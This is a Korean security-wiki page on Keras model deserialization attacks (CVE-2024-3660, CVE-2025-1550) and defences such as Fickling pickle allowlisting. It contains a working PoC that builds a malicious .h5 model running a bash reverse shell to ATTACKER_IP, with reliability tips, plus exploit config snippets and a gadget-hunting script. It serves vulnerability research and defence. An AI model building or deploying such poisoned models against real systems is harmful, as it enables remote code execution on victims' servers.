# Keras Model Deserialization RCE 및 Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 Keras model deserialization pipeline을 대상으로 한 practical exploitation techniques를 요약하고, native .keras format의 내부 구조와 attack surface를 설명하며, Model File Vulnerabilities (MFVs) 및 post-fix gadgets를 찾기 위한 researcher toolkit을 제공합니다.

## .keras model format 내부 구조

A .keras 파일은 최소한 다음을 포함하는 ZIP archive입니다:<sup>[[1]](#references)</sup>
- metadata.json – 일반 정보(예: Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – HDF5의 weights

config.json은 recursive deserialization을 제어합니다. Keras는 modules을 import하고, classes/functions를 resolve하며, attacker-controlled dictionaries에서 layers/objects를 재구성합니다.<sup>[[1]](#references)</sup>

Dense layer object의 example snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization은 다음을 수행합니다:<sup>[[1]](#references)</sup>
- module/class_name 키를 사용한 Module import 및 symbol resolution
- attacker-controlled kwargs를 사용한 from_config(...) 또는 constructor invocation
- 중첩된 object(activations, initializers, constraints 등)으로의 recursion

역사적으로 이는 config.json을 조작하는 attacker에게 다음 세 가지 primitive를 노출했습니다:<sup>[[1]](#references)</sup>
- 어떤 modules를 import할지 제어
- 어떤 classes/functions를 resolve할지 제어
- constructors/from_config에 전달되는 kwargs 제어

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config()은 python_utils.func_load(...)를 사용했으며, 이 함수는 attacker bytes를 base64-decode한 뒤 marshal.loads()를 호출합니다. Python unmarshalling은 code를 execute할 수 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>

Exploit idea (config.json에 포함되는 simplified payload):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras는 기본적으로 safe_mode=True를 적용합니다. Lambda 내의 serialized Python functions는 사용자가 명시적으로 safe_mode=False를 선택하지 않는 한 차단됩니다.<sup>[[1]](#references)</sup>

Notes:
- Legacy formats(이전 HDF5 저장 형식) 또는 오래된 codebases에서는 최신 검사를 적용하지 않을 수 있으므로, victim이 이전 loaders를 사용할 때는 “downgrade” 방식의 attacks가 여전히 적용될 수 있습니다.

## CVE-2025-1550 – Keras ≤ 3.8의 Arbitrary module import

Root cause:
- _retrieve_class_or_fn은 config.json의 attacker-controlled module strings를 사용하여 unrestricted importlib.import_module()을 호출했습니다.
- Impact: 설치된 모든 module(또는 sys.path에 attacker가 심어 둔 module)을 Arbitrary import할 수 있습니다. Import-time code가 실행된 후 attacker kwargs를 사용해 object construction이 수행됩니다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
보안 개선 사항 (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: 공식 ecosystem modules로 imports 제한: keras, keras_hub, keras_cv, keras_nlp
- Safe mode 기본값: safe_mode=True는 안전하지 않은 Lambda serialized-function loading을 차단
- 기본 type checking: deserialized objects는 예상된 types와 일치해야 함

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

많은 production stack은 여전히 legacy TensorFlow-Keras HDF5 model files (.h5)을 허용합니다. 공격자가 서버에 업로드한 model을 서버가 이후 load하거나 inference를 실행할 수 있다면, Lambda layer는 load/build/predict 시 임의의 Python을 실행할 수 있습니다.<sup>[[7]](#references)</sup>

deserialized되거나 사용될 때 reverse shell을 실행하는 악성 .h5를 생성하는 최소 PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
참고 사항 및 신뢰성 팁:
- Trigger points: code가 여러 번 실행될 수 있습니다(예: layer build/first call, model.load_model 및 predict/fit 중). payload는 idempotent하게 작성하세요.<sup>[[7]](#references)</sup>
- Version pinning: serialization 불일치를 방지하려면 대상의 TF/Keras/Python 버전에 맞추세요. 예를 들어 대상이 Python 3.8 및 TensorFlow 2.13.1을 사용한다면 해당 환경에서 artifacts를 build하세요.<sup>[[7]](#references)</sup>
- 빠른 환경 복제:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- 검증: os.system("ping -c 1 YOUR_IP")와 같은 benign payload는 reverse shell로 전환하기 전에 실행 여부를 확인하는 데 도움이 됩니다(예: tcpdump로 ICMP 관찰).<sup>[[7]](#references)</sup>

## allowlist 내부의 수정 후 gadget surface

allowlisting과 safe mode를 사용하더라도 허용된 Keras callable 중에는 여전히 광범위한 surface가 남아 있습니다. 예를 들어, keras.utils.get_file은 임의의 URL을 사용자가 선택한 위치에 다운로드할 수 있습니다.<sup>[[1]](#references)</sup>

허용된 함수를 참조하는 Lambda를 통한 Gadget(직렬화된 Python bytecode가 아님):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- `Lambda.call()`은 대상 callable을 호출할 때 입력 tensor를 첫 번째 positional argument로 앞에 추가합니다. 선택한 gadget은 추가 positional arg를 허용하거나 (`*args`/**kwargs`)를 받아야 합니다. 이로 인해 사용 가능한 함수가 제한됩니다.<sup>[[1]](#references)</sup>

## AI/ML 모델을 위한 ML pickle import allowlisting (Fickling)

많은 AI/ML 모델 형식(PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, 이전 버전의 TensorFlow artifacts 등)은 Python pickle 데이터를 내장합니다. 공격자는 load 중 RCE 또는 model swapping을 달성하기 위해 pickle GLOBAL imports와 object constructors를 일상적으로 악용합니다. Blacklist 기반 scanner는 새롭거나 목록에 없는 위험한 imports를 놓치는 경우가 많습니다.<sup>[[8]](#references)[[14]](#references)</sup>

실용적인 fail-closed 방어 방법은 Python의 pickle deserializer를 hook하고, unpickling 중 검토된 무해한 ML 관련 imports만 허용하는 것입니다. Trail of Bits의 Fickling은 이 정책을 구현하며, 수천 개의 공개 Hugging Face pickles를 기반으로 만든 엄선된 ML import allowlist를 제공합니다.<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports에 대한 보안 모델(연구 및 실무에서 도출한 직관): pickle에서 사용되는 imported symbols는 다음 조건을 모두 충족해야 합니다.<sup>[[8]](#references)</sup>
- 코드를 실행하거나 실행을 유발하지 않아야 합니다(compiled/source code objects, shelling out, hooks 등 금지).
- 임의의 attributes 또는 items를 가져오거나 설정하지 않아야 합니다.
- pickle VM에서 다른 Python objects를 import하거나 이에 대한 references를 가져오지 않아야 합니다.
- 간접적으로라도 secondary deserializers(예: marshal, nested pickle)를 trigger하지 않아야 합니다.

프로세스 startup 시 가능한 한 이른 시점에 Fickling의 protections를 활성화하여, framework가 수행하는 모든 pickle loads(torch.load, joblib.load 등)가 검사되도록 하십시오.<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
운영 팁:
- 필요한 경우 hooks를 일시적으로 비활성화하거나 다시 활성화할 수 있습니다:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 신뢰할 수 있는 모델이 차단된 경우, 심볼을 검토한 후 해당 환경의 allowlist를 확장하세요:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling은 더 세분화된 제어가 필요한 경우 사용할 수 있는 generic runtime guard도 제공합니다:<sup>[[9]](#references)</sup>
- 모든 pickle.load()에 대해 검사를 강제하려면 `fickling.always_check_safety()`
- 범위를 지정해 강제하려면 `with fickling.check_safety():`
- 일회성 검사를 수행하려면 `fickling.load(path)` / `fickling.is_likely_safe(path)`

- 가능한 경우 non-pickle model format을 우선 사용하세요(예: SafeTensors).<sup>[[15]](#references)</sup> pickle을 반드시 허용해야 한다면, network egress를 차단하고 least privilege로 loader를 실행하며 allowlist를 적용하세요.

이 allowlist-first 전략은 compatibility를 높게 유지하면서 일반적인 ML pickle exploit 경로를 차단하는 효과를 입증했습니다. ToB의 benchmark에서 Fickling은 synthetic malicious file의 100%를 탐지했으며, 주요 Hugging Face repo의 clean file 중 약 99%를 허용했습니다.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) 허용된 module에서 체계적으로 gadget discovery 수행

keras, keras_nlp, keras_cv, keras_hub 전반에서 candidate callable을 열거하고, file/network/process/env side effect가 있는 항목을 우선순위화합니다.<sup>[[1]](#references)</sup>

<details>
<summary>allowlisted Keras module에서 잠재적으로 위험한 callable 열거</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) 직접 deserialization testing (.keras archive 불필요)

crafted dicts를 Keras deserializers에 직접 전달하여 허용되는 params를 파악하고 side effects를 관찰합니다.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing 및 형식

Keras는 서로 다른 보호 장치와 형식을 사용하는 여러 codebase/era에 존재합니다:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, 삭제 예정)
- tf-keras: 별도로 유지 관리됨
- Multi-backend Keras 3 (official): 네이티브 .keras 도입

codebase와 형식(.keras 및 legacy HDF5) 전반에서 테스트를 반복하여 regression이나 누락된 보호 장치를 찾아냅니다.

## 참고 자료

- [1] [Keras Model Deserialization의 취약점 탐색 (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serialization에 검사 추가](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling의 새로운 AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML 환경 보안 (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks 배경](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
